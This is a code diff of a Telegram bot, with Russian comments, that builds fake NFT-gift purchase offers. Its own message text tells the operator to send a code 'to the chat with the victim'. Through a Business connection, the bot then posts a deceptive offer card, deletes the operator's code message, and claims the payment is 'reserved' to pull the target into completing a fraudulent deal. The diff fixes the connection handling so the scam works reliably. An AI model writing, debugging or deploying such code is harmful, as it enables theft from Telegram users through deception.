@@ -28,7 +28,7 @@ dp = Dispatcher()
 router = Router()
 dp.include_router(router)
 
-BUSINESS_CONN_ID = None
+# Больше не нужна глобальная переменная!
 
 NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
 PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
@@ -78,7 +78,7 @@ async def cmd_buy(msg: Message):
         await msg.reply("❌ Не понял ссылку или цену. Пример:\n<code>/купить https://t.me/nft/... 155 GRAM</code>")
         return
 
-    # Генерируем короткий код (типа of_qoe82)
+    # Генерируем короткий код
     oid = "of_" + uuid.uuid4().hex[:5]
     
     make_offer(
@@ -88,10 +88,10 @@ async def cmd_buy(msg: Message):
     )
 
     await msg.reply(
-        f"✅ <b>Оффер создан и запомнен!</b>\n\n"
+        f"✅ <b>Оффер создан!</b>\n\n"
         f"Подарок: {nft['name']}\n"
         f"Цена: {price}\n\n"
-        f"Скопируй этот код: <code>{oid}</code>\n"
+        f"Код: <code>{oid}</code>\n"
         f"Отправь его в чат с жертвой."
     )
 
@@ -106,7 +106,7 @@ async def handle_business_message(msg: Message):
     # Ищем код оффера в тексте
     m = re.search(r"(of_[a-f0-9]{5})", msg.text.lower())
     if not m:
-        return # Если нет кода, игнорируем
+        return
 
     oid = m.group(1)
     offer = get_offer(oid)
@@ -115,13 +115,15 @@ async def handle_business_message(msg: Message):
         log.error(f"Оффер {oid} не найден в базе")
         return
 
-    log.info(f"✅ Найден оффер по коду {oid}. Отправляем...")
+    log.info(f"✅ Найден оффер {oid}. Отправляем...")
 
-    if not BUSINESS_CONN_ID:
-        log.error("❌ Нет BUSINESS_CONN_ID!")
+    # Берем ID подключения ПРЯМО ИЗ СООБЩЕНИЯ
+    conn_id = msg.business_connection_id
+    
+    if not conn_id:
+        log.error("❌ В сообщении нет business_connection_id! Проверь, что это точно Business-чат.")
         return
 
-    # Текст карточки
     target_user = msg.from_user.username or "buyer"
     card_text = (
         f"Пользователь <b>{target_user}</b> предлагает Вам <b>{offer['price']}</b> "
@@ -130,23 +132,22 @@ async def handle_business_message(msg: Message):
         f"https://t.me/nft/{offer['nft_slug']}"
     )
 
-    # Кнопки
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="Отклонить", callback_data=f"reject:{oid}"),
          InlineKeyboardButton(text="Принять", callback_data=f"accept:{oid}")]
     ])
     
     try:
-        # 1. Отправляем карточку (с текстом, чтобы не было ошибки)
+        # Отправляем карточку
         await bot.send_message(
             chat_id=msg.chat.id,
             text=card_text,
-            business_connection_id=BUSINESS_CONN_ID,
-            reply_markup=kb, # Кнопки крепим прямо к карточке
+            business_connection_id=conn_id, # <--- ИСПОЛЬЗУЕМ ЕГО ЗДЕСЬ
+            reply_markup=kb,
             disable_web_page_preview=False
         )
         
-        # 2. Удаляем код из чата
+        # Удаляем код из чата
         try:
             await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
         except Exception as e:
@@ -174,7 +175,10 @@ async def on_accept(cb: CallbackQuery):
         await cb.answer("Оффер истек", show_alert=True)
         return
     
-    if BUSINESS_CONN_ID:
+    # Получаем ID подключения из сообщения с кнопкой
+    conn_id = cb.message.business_connection_id
+    
+    if conn_id:
         text = (
             f"<b>Сумма {o['price']} зарезервирована.</b>\n\n"
             f"Чтобы завершить сделку:\n"
@@ -186,7 +190,7 @@ async def on_accept(cb: CallbackQuery):
         await bot.send_message(
             chat_id=cb.message.chat.id, 
             text=text, 
-            business_connection_id=BUSINESS_CONN_ID
+            business_connection_id=conn_id
         )
     
     try:
@@ -196,12 +200,10 @@ async def on_accept(cb: CallbackQuery):
 
 
 # ==========================================
-# BUSINESS CONNECTION
+# BUSINESS CONNECTION (Логируем, но не сохраняем)
 # ==========================================
 @router.business_connection()
 async def on_business_conn(conn: BusinessConnection):
-    global BUSINESS_CONN_ID
-    BUSINESS_CONN_ID = conn.id
     log.info(f"✅ Business connection: user={conn.user.id} id={conn.id}")
 
 
